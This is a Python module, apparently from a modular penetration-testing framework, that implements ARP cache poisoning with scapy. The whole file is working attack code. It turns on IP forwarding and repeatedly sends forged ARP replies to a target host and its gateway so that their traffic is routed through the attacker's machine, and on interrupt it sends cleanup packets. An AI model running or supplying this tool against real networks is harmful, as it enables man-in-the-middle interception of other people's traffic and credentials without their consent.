from scapy.all import *
from core.utils import get_mac, enable_ip_forward
from time import sleep
from core import base

conf.verb = 0


class Main(base.Module):
    """ARP Cache poisoning"""
    parameters = {
        "target": "192.168.1.240",
        "gateway": "192.168.1.24"

    }
    completions = list(parameters.keys())

    def do_execute(self, line):
        """Execute current module"""
        enable_ip_forward()
        while True:
            try:
                # Start spoof
                self._spoof(target=self.parameters['target'], getway=self.parameters['gateway'])
                self._spoof(target=self.parameters['gateway'], getway=self.parameters['target'])
                sleep(0.2)

            except KeyboardInterrupt:
                # Restore
                self._restore(target=self.parameters['target'], getway=self.parameters['gateway'])
                self._restore(target=self.parameters['gateway'], getway=self.parameters['target'])
                break



    def _spoof(self, target, getway):
        target_mac = get_mac(ip=target)
        arp_response = ARP(pdst=target, hwdst=target_mac, psrc=getway, op='is-at')
        # get the MAC address
        self_mac = ARP().hwsrc
        # send the packet
        send(arp_response)
        self.cp.success(f"Sent to {target} : {getway} MAC {self_mac}")


    def _restore(self, target, getway):
        self.cp.warning(f"Stoping arp spoofing ...")
        target_mac = get_mac(ip=target)
        arp_response = ARP(pdst=target, hwdst=target_mac, psrc=getway, op='is-at')
        send(arp_response, verbose=0, count=7)

    def complete_set(self, text, line, begidx, endidx):
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.completions if s.startswith(mline)]
